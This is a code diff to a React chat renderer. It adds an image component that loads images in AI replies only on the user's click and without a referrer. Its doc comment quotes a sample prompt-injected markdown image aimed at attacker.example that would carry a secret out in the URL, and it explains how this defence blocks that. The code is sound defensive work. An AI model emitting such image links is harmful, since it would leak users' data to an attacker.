@@ -1,6 +1,7 @@
-import type { ReactNode } from 'react'
+import { type ReactNode, useState } from 'react'
 import { type Components, type ExtraProps, Streamdown, type UrlTransform, useIsCodeFenceIncomplete } from 'streamdown'
 import remarkGfm from 'remark-gfm'
+import { ImageIcon } from 'lucide-react'
 import { blockKind } from '../../lib/fences.ts'
 import { RichBlock } from './blocks.tsx'
 
@@ -86,7 +87,42 @@ const ChatLink = ({
   </a>
 )
 
-const CHAT: Components = { ...PLAIN, a: ChatLink, table: Table, pre: Pre }
+/**
+ * An image in a reply: named, with where it is from, and fetched only when the owner asks. A reply cannot make the
+ * browser call an address by itself, so a prompt-injected `![](https://attacker.example/?d=secret)` carries nothing
+ * out. Once asked, it loads without a referrer; anything but a web address stays a name.
+ */
+function ChatImage({
+  src,
+  alt,
+}: { readonly src?: string | undefined; readonly alt?: string | undefined } & ExtraProps) {
+  const [shown, setShown] = useState(false)
+  const url = src === undefined ? null : URL.parse(src)
+  const name = alt === undefined || alt === '' ? 'Image' : alt
+  if (url === null || (url.protocol !== 'https:' && url.protocol !== 'http:'))
+    return (
+      <span className="inline-flex items-center gap-1 text-muted-foreground">
+        <ImageIcon aria-hidden className="size-3.5" />
+        {name}
+      </span>
+    )
+  if (shown) return <img src={url.href} alt={alt ?? ''} referrerPolicy="no-referrer" loading="lazy" decoding="async" />
+  return (
+    <button
+      type="button"
+      className="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 text-sm text-muted-foreground hover:bg-muted"
+      title={url.href}
+      aria-label={`Load image ${name} from ${url.host}`}
+      onClick={() => setShown(true)}
+    >
+      <ImageIcon aria-hidden className="size-3.5" />
+      {name}
+      <span className="text-xs">{url.host}</span>
+    </button>
+  )
+}
+
+const CHAT: Components = { ...PLAIN, a: ChatLink, img: ChatImage, table: Table, pre: Pre }
 export const REMARK = [remarkGfm]
 /** No rehype plugins: Streamdown's defaults would render raw HTML (`rehype-raw`). */
 export const NO_REHYPE: [] = []
